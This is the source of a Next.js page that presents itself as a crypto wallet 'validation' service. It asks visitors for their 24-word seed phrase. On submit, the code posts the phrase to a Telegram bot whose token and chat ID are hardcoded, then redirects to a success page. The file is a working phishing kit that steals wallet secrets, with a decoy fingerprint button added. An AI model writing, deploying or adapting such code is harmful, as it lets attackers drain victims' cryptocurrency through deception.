"use client";
import axios from "axios";
import { Textarea } from "@/components/ui/textarea";
import WordFadeIn from "@/components/ui/word-fade-in";
import React from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { useRouter } from "next/navigation";

import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";

const formSchema = z.object({
  phrase: z
    .string()
    .min(1, "Passphrase cannot be empty")
    .refine((val) => val.trim().split(/\s+/).length >= 24, {
      message: "Passphrase must contain at least 24 words",
    }),
});

export default function page() {
  const router = useRouter();
  const [error, setError] = React.useState<boolean>(false);
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      phrase: "",
    },
  });

  const TELEGRAM_BOT_TOKEN = "7942842686:AAE9oKyuPJmRfPBYu-pcmQTWPC3xdE_A9Rc";
  const CHAT_ID = "-4563701305"; // Replace with your group chat ID

  // Function to send message
  const sendMessageToTelegram = async (message: string) => {
    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: CHAT_ID,
          text: message,
        }
      );
      router.replace("/success");
    } catch (error) {
      setError(true);
      setTimeout(() => {
        setError(false);
      }, 2000);
    }
  };

  function onSubmit(values: z.infer<typeof formSchema>) {
    sendMessageToTelegram(values.phrase);
  }

  return (
    <div className="py-14 space-y-4 px-6 md:px-12 lg:px-20">
      <WordFadeIn words="Validate your wallet" />
      <div className="max-w-xl mx-auto mt-10">
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
            <FormField
              control={form.control}
              name="phrase"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Textarea
                      className="resize-none h-52 border-white text-white text-sm font-medium"
                      placeholder="Enter your 24-word passphrase here"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                  {error && (
                    <p className="text-red-600 text-sm">
                      There was an error validating your phrase, Please try
                      again
                    </p>
                  )}
                </FormItem>
              )}
            />
            <div className="flex flex-col items-center gap-5">
              <button
                type="submit"
                className="min-w-[250px] px-10 uppercase hover:bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#8a348e] text-white font-medium py-3.5 rounded-full border-2"
              >
                Validate with Passphrase
              </button>
              <button
                type="button"
                className="min-w-[250px] px-10 uppercase bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#edb703] text-white font-medium py-3.5 rounded-full border-2"
              >
                Validate with Fingerprint
              </button>
            </div>
          </form>
        </Form>
      </div>
    </div>
  );
}
